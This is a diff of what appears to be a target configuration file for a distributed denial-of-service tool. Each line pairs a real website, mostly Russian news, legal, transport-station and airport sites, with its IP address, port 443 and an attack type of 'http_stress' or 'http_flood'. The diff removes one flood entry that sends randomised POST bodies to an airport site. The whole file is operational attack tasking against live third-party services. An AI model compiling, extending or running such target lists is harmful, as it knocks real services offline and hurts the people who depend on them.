@@ -8,7 +8,6 @@
   {"kind":"http_stress","method":"GET","ip":"185.107.73.225","port": 443, "url": "https://politpuzzle.ru/"}
   {"kind":"http_stress","method":"GET","ip":"185.4.73.250","port": 443, "url": "https://zakon.wiki/"},
   {"kind":"http_stress","method":"GET","ip":"176.57.216.15","port": 443, "url": "https://khv.aero/"},
-  {"kind":"http_flood","method":"POST","ip":"176.57.216.15","port": 443, "url": "https://khv.aero/", "headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
   {"kind":"http_stress","method":"GET","ip":"91.106.206.229","port": 443, "url": "https://khab-vc.ru/"},
   {"kind":"http_stress","method":"GET","ip":"87.236.16.130","port": 443, "url": "https://online-vokzal.ru/"},
   {"kind":"http_stress","method":"GET","ip":"87.236.16.254","port": 443, "url": "https://avtovokzal-anapa.ru/"}
